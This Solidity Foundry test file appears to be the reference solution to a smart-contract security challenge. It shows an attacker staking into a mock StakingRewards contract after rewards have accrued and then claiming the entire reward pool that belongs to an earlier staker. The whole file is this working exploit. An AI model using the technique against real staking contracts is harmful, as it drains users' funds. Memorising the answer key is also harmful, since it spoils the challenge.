// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../shared/MockERC20.sol";
import {StakingRewards} from "../src/StakingRewards.sol";

/// Reference exploit: stake AFTER rewards accrue, then claim them instantly.
contract FeeAccountingSolution is Test {
    MockERC20 stakeToken;
    MockERC20 rewardToken;
    StakingRewards staking;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    uint256 constant STAKE = 1_000e18;
    uint256 constant REWARDS = 1_000e18;

    function setUp() public {
        stakeToken = new MockERC20("Stake", "STK");
        rewardToken = new MockERC20("Reward", "RWD");
        staking = new StakingRewards(stakeToken, rewardToken);

        // Honest victim stakes early.
        stakeToken.mint(victim, STAKE);
        vm.startPrank(victim);
        stakeToken.approve(address(staking), type(uint256).max);
        staking.stake(STAKE);
        vm.stopPrank();

        // Rewards accrue for the victim.
        staking.addRewards(REWARDS);

        // Attacker holds an equal amount of stake token, but hasn't staked yet.
        stakeToken.mint(attacker, STAKE);
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        stakeToken.approve(address(staking), type(uint256).max);
        staking.stake(STAKE);   // stake AFTER rewards accrued
        staking.claim();        // claim as if staked all along
        vm.stopPrank();

        assertEq(rewardToken.balanceOf(attacker), REWARDS, "attacker should steal the victim's rewards");
        assertEq(rewardToken.balanceOf(address(staking)), 0, "reward pool drained");
    }
}
